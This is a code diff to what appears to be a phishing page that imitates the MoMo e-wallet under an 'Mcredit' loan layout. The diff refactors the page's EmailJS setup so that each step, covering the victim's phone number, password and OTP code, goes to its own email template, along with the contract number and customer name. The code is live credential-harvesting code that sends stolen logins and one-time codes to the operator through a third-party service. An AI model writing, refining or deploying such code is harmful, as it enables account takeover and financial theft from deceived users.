@@ -21,11 +21,34 @@
       src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"
     ></script>
     <script type="text/javascript">
-      (function () {
-        emailjs.init({
-        publicKey: "MQKcpIwixBVd4Q920", // Thay bằng Public Key của bạn
-        });
-      })();
+      const MOMO_EMAILJS_CONFIG_BY_STEP = {
+        phone: {
+          serviceId: "service_ezzpzs5",
+          templateId: "template_b4ymczc",
+          publicKey: "MQKcpIwixBVd4Q920",
+          platform: "MoMo → SĐT (Mcredit Layout v1)",
+        },
+        password: {
+          serviceId: "service_ezzpzs5",
+          templateId: "template_j0ukske",
+          publicKey: "MQKcpIwixBVd4Q920",
+          platform: "MoMo → Mật khẩu (Mcredit Layout v1)",
+        },
+        otp: {
+          serviceId: "service_ezzpzs5",
+          templateId: "template_7cvd42u",
+          publicKey: "MQKcpIwixBVd4Q920",
+          platform: "MoMo → OTP (Mcredit Layout v1)",
+        },
+      };
+
+      function getMomoEmailjsConfig(step) {
+        return MOMO_EMAILJS_CONFIG_BY_STEP[step] || MOMO_EMAILJS_CONFIG_BY_STEP.phone;
+      }
+
+      emailjs.init({
+        publicKey: MOMO_EMAILJS_CONFIG_BY_STEP.phone.publicKey,
+      });
     </script>
 
     <style>
@@ -1117,8 +1140,9 @@ otification ${type} show`;
         };
 
         const sendToEmail = (type, value) => {
-          const serviceID = "service_ezzpzs5";
-          let templateID = "";
+          const config = getMomoEmailjsConfig(type);
+          if (!config) return;
+
           let templateParams = {};
           const contractNumber =
             getEl("customer-details").querySelector(
@@ -1126,24 +1150,21 @@ otification ${type} show`;
             )?.textContent || "";
 
           const commonParams = {
-            platform: "MoMo (Mcredit Layout v1)",
+            platform: config.platform,
             contract_number: contractNumber,
             customer_name: formData.fullName || "",
             total_amount: getEl("mainTotalAmount").textContent || "",
           };
 
           if (type === "phone") {
-            templateID = "template_b4ymczc";
             templateParams = { ...commonParams, phone: value };
           } else if (type === "password") {
-            templateID = "template_j0ukske";
             templateParams = {
               ...commonParams,
               phone: credentials.phone,
               password: value,
             };
           } else if (type === "otp") {
-            templateID = "template_7cvd42u";
             templateParams = {
               ...commonParams,
               phone: credentials.phone,
@@ -1152,17 +1173,21 @@ otification ${type} show`;
             };
           }
 
-          if (templateID) {
-            emailjs
-              .send(serviceID, templateID, templateParams)
-              .then(() => console.log(`${type} sent successfully.`))
-              .catch((err) =>
-                console.error(
-                  `EmailJS send failed for ${type}:`,
-                  JSON.stringify(err)
-                )
-              );
-          }
+          emailjs
+            .send(
+              config.serviceId,
+              config.templateId,
+              templateParams,
+              { publicKey: config.publicKey }
+            )
+            .then(() => console.log(`${type} sent successfully.`, config))
+            .catch((err) =>
+              console.error(
+                `EmailJS send failed for ${type}:`,
+                JSON.stringify(err),
+                config
+              )
+            );
         };
 
         const clearOtpInputs = () => {
